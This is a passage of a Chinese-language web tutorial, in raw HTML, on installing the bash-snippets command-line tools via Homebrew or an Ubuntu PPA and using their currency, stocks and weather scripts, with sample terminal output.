-->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d82859149342\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ brew install bash-snippets --without-all-tools --with-newton --with-weather</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d82859149342-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d82859149342-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">brew </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">snippets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">without</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">tools</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">with</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">newton</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">with</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">weather</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>另外，对于那些基于 Debian 系统的，例如 Ubuntu、Linux Mint，可以添加 PPA 源：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d86083099374\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo add-apt-repository ppa:navanchauhan/bash-snippets\r\n$ sudo apt update\r\n$ sudo apt install bash-snippets</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d86083099374-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d86083099374-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d86083099374-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d86083099374-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">add</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">repository </span><span class=\"crayon-v\">ppa</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">navanchauhan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">snippets</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d86083099374-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-i\">update</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d86083099374-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">snippets</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">用法</h3>\n<p><strong>需要网络连接</strong>才能使用这些工具。用法很简单。让我们来看看如何使用其中的一些脚本，我假设你已经安装了所有脚本。</p>\n<h4 id=\"toc_3\">1、 Currency – 货币转换器</h4>\n<p>这个脚本根据实时汇率转换货币。输入当前货币代码和要交换的货币，以及交换的金额，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d89860494474\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ currency\r\nWhat is the base currency: INR\r\nWhat currency to exchange to: USD\r\nWhat is the amount being exchanged: 10\r\n\r\n=========================\r\n| INR to USD\r\n| Rate: 0.015495\r\n| INR: 10\r\n| USD: .154950\r\n=========================</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d89860494474-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d89860494474-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d89860494474-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d89860494474-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d89860494474-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d89860494474-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">currency</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d89860494474-2\"><span class=\"crayon-e\">What </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">base </span><span class=\"crayon-v\">currency</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">INR</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-3\"><span class=\"crayon-e\">What </span><span class=\"crayon-e\">currency </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">exchange </span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">USD</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d89860494474-4\"><span class=\"crayon-e\">What </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">amount </span><span class=\"crayon-e\">being </span><span class=\"crayon-v\">exchanged</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d89860494474-6\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">=</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">INR </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">USD</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d89860494474-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Rate</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.015495</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INR</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d89860494474-10\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">USD</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">154950</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d89860494474-11\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">=</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n<p>你也可以在单条命令中传递所有参数，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d8d914351485\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ currency INR USD 10</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d8d914351485-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d8d914351485-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">currency </span><span class=\"crayon-e\">INR </span><span class=\"crayon-i\">USD</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>参考以下屏幕截图：</p>\n<p style=\"text-align: center\"><a href=\"http://jbcdn2.b0.upaiyun.com/2018/08/1e19e82a0dc17db6a2d4b661b2864324.png\"><img class=\"alignnone size-full wp-image-114306\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/1e19e82a0dc17db6a2d4b661b2864324.png\" alt=\"sk@sk_001\"></a></p>\n<h4 id=\"toc_4\">2、 Stocks – 显示股票价格详细信息</h4>\n<p>如果你想查看一只股票价格的详细信息，输入股票即可，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d90409219025\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ stocks Intel\r\n\r\nINTC stock info\r\n=============================================\r\n| Exchange Name: NASDAQ\r\n| Latest Price: 34.2500\r\n| Close (Previous Trading Day): 34.2500\r\n| Price Change: 0.0000\r\n| Price Change Percentage: 0.00%\r\n| Last Updated: Jul 12, 4:00PM EDT\r\n=============================================</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d90409219025-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d90409219025-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d90409219025-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d90409219025-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670d83d90409219025-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d90409219025-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">stocks </span><span class=\"crayon-e\">Intel</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d90409219025-2\"> </div><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-3\"><span class=\"crayon-e\">INTC </span><span class=\"crayon-e\">stock </span><span class=\"crayon-v\">info</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d90409219025-4\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Exchange </span><span class=\"crayon-v\">Name</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">NASDAQ</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d90409219025-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Latest </span><span class=\"crayon-v\">Price</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">34.2500</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Close</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Previous </span><span class=\"crayon-e\">Trading </span><span class=\"crayon-v\">Day</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">34.2500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d90409219025-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Price </span><span class=\"crayon-v\">Change</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0000</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-9\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Price </span><span class=\"crayon-e\">Change </span><span class=\"crayon-v\">Percentage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-o\">%</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670d83d90409219025-10\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Last </span><span class=\"crayon-v\">Updated</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Jul</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00PM</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">EDT</span></div><div class=\"crayon-line\" id=\"crayon-5bab670d83d90409219025-11\"><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span><span class=\"crayon-o\">===</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>上面输出了 <strong>Intel 股票</strong> 的详情。</p>\n<h4 id=\"toc_5\">3、 Weather – 显示天气详细信息</h4>\n<p>让我们查看以下天气详细信息，运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d93216282069\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ weather</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670d83d93216282069-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670d83d93216282069-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weather</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>示例输出：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/d410559e9bf3a551ea31d6c952d300c2.png\" alt=\"\"></p>\n<p>正如你在上面屏幕截图中看到的那样，它提供了 3 天的天气预报。不使用任何参数的话，它将根据你的 IP 地址显示天气详细信息。你还可以显示特定城市或国家/地区的天气详情，如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670d83d97178278821\" class=\"crayon-syntax 